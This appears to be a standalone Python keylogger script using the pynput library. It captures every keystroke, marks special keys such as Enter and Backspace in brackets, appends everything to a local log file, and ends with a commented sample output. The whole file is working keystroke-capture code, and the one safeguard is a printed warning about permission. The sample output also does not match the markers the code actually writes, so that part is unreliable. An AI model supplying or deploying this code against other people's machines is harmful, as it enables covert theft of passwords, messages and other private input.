from pynput import keyboard
import time
import os

class KeyLogger:
    def __init__(self, filename="keylog.txt"):
        self.filename = filename
        self.start_time = time.ctime()
        
    def on_press(self, key):
        try:
            # Convert key to string representation
            key_str = str(key).replace("'", "")
            
            # Handle special keys
            if key == keyboard.Key.space:
                key_str = " "
            elif key == keyboard.Key.enter:
                key_str = "[ENTER]\n"
            elif key == keyboard.Key.tab:
                key_str = "[TAB]"
            elif key == keyboard.Key.backspace:
                key_str = "[BACKSPACE]"
            elif key == keyboard.Key.shift:
                key_str = "[SHIFT]"
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                key_str = "[CTRL]"
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                key_str = "[ALT]"
            elif key == keyboard.Key.esc:
                key_str = "[ESC]"
                
            # Write to file
            with open(self.filename, 'a') as log_file:
                log_file.write(key_str)
                
        except Exception as e:
            with open(self.filename, 'a') as log_file:
                log_file.write(f"[ERROR: {str(e)}]")

    def start_logging(self):
        # Write initial timestamp to file
        with open(self.filename, 'a') as log_file:
            log_file.write(f"\n\n[Keylogging started at {self.start_time}]\n")
        
        # Create listener
        listener = keyboard.Listener(on_press=self.on_press)
        
        # Start listener
        listener.start()
        
        print(f"Keylogger started. Logging to {self.filename}")
        print("Press CTRL+C to stop...")
        
        try:
            listener.wait()  # Wait for the listener to start
            listener.join()  # Keep the program running
        except KeyboardInterrupt:
            with open(self.filename, 'a') as log_file:
                log_file.write(f"\n[Keylogging stopped at {time.ctime()}]\n")
            print("\nKeylogger stopped.")

def main():
    # Ensure you have pynput installed: pip install pynput
    print("WARNING: Use this keylogger ethically and with permission only!")
    print("Unauthorized use may be illegal in your jurisdiction.")
    
    # Get log file location
    default_path = os.path.join(os.getcwd(), "keylog.txt")
    log_file = input(f"Enter log file path (default: {default_path}): ") or default_path
    
    # Initialize and start keylogger
    keylogger = KeyLogger(log_file)
    keylogger.start_logging()

if __name__ == "__main__":
    main()

#output 
#[Started at Wed Apr 09 12:00:00 2025]
#Hello world
#[TAB]test[BACKSPACE]
#[Stopped at Wed Apr 09 12:01:00 2025]
